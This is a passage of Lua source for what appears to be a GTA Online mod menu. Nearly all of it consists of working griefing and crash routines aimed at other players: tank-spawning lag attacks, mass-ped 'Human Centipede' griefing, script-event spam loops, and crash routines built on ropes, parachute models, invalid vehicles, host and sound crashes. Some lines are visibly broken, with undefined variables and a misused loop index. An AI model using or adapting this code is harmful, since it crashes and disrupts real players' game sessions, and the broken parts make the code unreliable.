    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwithss, "Lag With Khanjali's", {"lagwithkhanjali"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Khanjali's V2", {"lagwithkhanjaliv2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end
    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
centipedegriefing = menu.list(newcrash, "Human Centipede", {}, "", function(); end)

menu.action(centipedegriefing, "Human Centipede", {"centipede"}, "", function()
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end

            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(centipedegriefing, "Human Centipede", {"togglecentipede"}, "", function(on_toggle)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end

            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.toggle_loop(newcrash, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        if ent ~= PLAYER.PLAYER_PED_ID() then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
    end
        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            util.yield()
        return
    end
end)


menu.toggle_loop(newcrash,"Funny Spam Loop", {""} ,"" , function()
    util.trigger_script_event(1 << pid, {1240068495,pid, math.random(1240068495,1240068495)})
    util.trigger_script_event(1 << pid, {1915499503,pid, math.random(1915499503,1915499503)})
    util.trigger_script_event(1 << pid, {-1425016400,pid, math.random(-1425016400,-1425016400)})
    util.trigger_script_event(1 << pid, {-1529596656,pid, math.random(-1529596656,-1529596656)})
    util.trigger_script_event(1 << pid, {-283041276,pid, math.random(-283041276,-283041276)})
    util.trigger_script_event(1 << pid, {-1838276770,pid, math.random(-1838276770,-1838276770)})
    util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
    util.trigger_script_event(1 << pid, {-1388926377,pid, math.random(-1388926377,-1388926377)})
    util.trigger_script_event(1 << pid, {2131601101,pid, math.random(2131601101,2131601101)})
    util.trigger_script_event(1 << pid, {1361475530,pid, math.random(1361475530,1361475530)})
    util.trigger_script_event(1 << pid, {1111927333,pid, math.random(1111927333,1111927333)})
    util.trigger_script_event(1 << pid, {-1390976345,pid, math.random(-1390976345,-1390976345)})           --frezze--
    util.trigger_script_event(1 << pid, {-768108950,pid, math.random(-768108950,-768108950)}) 
    util.trigger_script_event(1 << pid, {-714268990,pid, math.random(-714268990,-714268990)})
    util.trigger_script_event(1 << pid, {1214823473,pid, math.random(1214823473,1214823473)})
    util.trigger_script_event(1 << pid, {2095232746,pid, math.random(2095232746,2095232746)})
    util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
    util.trigger_script_event(1 << pid, {-555356783, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
end)



menu.toggle_loop(newcrash, "Player Parachute Crash", {}, "", function()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local hashes = {util.joaat("prop_beach_parasol_02"), util.joaat("prop_parasol_04c")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.pid(), hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, 0xFBAB5776, 1000, false)
        util.yield(200)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(ped)
        end
        util.yield(1200)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)
menu.toggle_loop(newcrash, "Ruiner Parachute Crash", {}, "", function ()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    RqModel(util.joaat("Ruiner2"))
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), pos, 0, true)
    PED.SET_PED_INTO_VEHICLE(ped, Ruiner2, -1)
    local hashes = {util.joaat("prop_beach_parasol_05"), util.joaat("prop_parasol_02")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, 0, 0, 500, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, hashes[i])
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(1200)
    end
    entities.delete_by_handle(Ruiner2)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)
menu.action(newcrash, "Rope Crash No Notification ", {""}, "", function (pid)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
end)

menu.action(newcrash,"R0 Crash", {""} ,"" , function(pid)
    local pos = players.get_position(pid)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    local pos = players.get_position(pid)
    entities.create_vehicle(pos,0X187D938D,0)
end)

menu.toggle_loop(newcrash, "Indirect Freemode Crash", {}, "Midnight Destroy SH", function()
    util.trigger_script_event(players.get_script_host() , {1368055548,players.get_script_host(), 0, 1, 0})
end)



menu.action(newcrash, "DR Crash", {}, "", function()
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,1349725314,-255678177,-255678177}
    local vehicles = {}
    for i = 1, 20 do
        util.create_thread(function()
            RqModel(hashes[i])
            menu.trigger_commands("anticrashcam on")
            local pcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield(2000)
            end
            vehicles[#vehicles+1] = veh
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            local pos = players.get_position(pid)
            local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
            local pos = players.get_position(pid)
            util.yield(2000)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
            util.yield(2000)
        end)
    end
    util.yield(2000)
    menu.trigger_commands("anticrashcam off")
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.action(newcrash, "Host Crash", {""}, "", function()
    local myPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 10814.29, -9751.18, 2000.0, 0, 0, 1)--HOSTCRASH
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),true)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 0, 0, 7.0, 0, 0, 1)
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),false)
    end) 


    menu.action(newcrash, "Script Host Crash", {}, "", function()
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
            util.trigger_script_event(1 << pid, {495813132, pid,-4640169,0,0,0,-36565476,-53105203})

    end)

    menu.action(newcrash, "Mother Nature Crash", {}, "Causes Crash Event (A1:1705D85C).", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_prop_bush_mang_ad")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(newcrash,"AIO Crash", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.action(newcrash, "Ghost crash", {}, "", function ()
        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid())
        mypos = players.getposition(pedp)
        tr2 = 2078290630
        local vehicle = CreateVehicle(tr2, mypos,ENTITY.GET_ENTITY_HEADING(pedp),true)
        ENTITY.ATTACH_ENTITY_TOENTITY(vehicle, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
        playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 0, 10 do
        playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
        end
            util.yield(15)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
    end)
    
    menu.action(newcrash, "5G Lite", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(newcrash,"Invalid Data Ultimate ", {""} ,"" , function()
        BadNetVehicleCrash3(pid)
        util.yield(1000)
    end)
    

    menu.toggle_loop(newcrash,"AIO Loop", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
         end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.toggle_loop(newcrash,"Script crash", {""} ,"" , function()
        util.trigger_script_event(1 << pid,{526822748,pid, 526822748})
        util.trigger_script_event(1 << pid,{-555356783,pid, -555356783})
        util.trigger_script_event(1 << pid,{495813132,pid, 495813132})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1992522613})
        util.trigger_script_event(1 << pid,{1214823473,pid, 1214823473})
        util.trigger_script_event(1 << pid,{-634789188,pid, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, -668341698})
        util.trigger_script_event(1 << pid,{-1388926377,pid, -1388926377})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
    end)
    menu.toggle_loop(newcrash,"Razorable Crash", {""} ,"" , function()
        BadNetVehicleCrash(pid)
        util.yield(1000)
    end)

    menu.toggle_loop(newcrash,"Orange 4G", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    local SoundRemovals_List = menu.list(Removals_List, "Sounds", {"command_for_list"}, "Description")

    menu.divider(SoundRemovals_List, "Spam sounds")

    menu.divider(SoundRemovals_List, "Errape and sounds crash")
    menu.action(SoundRemovals_List, "Sound Crash lobby", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
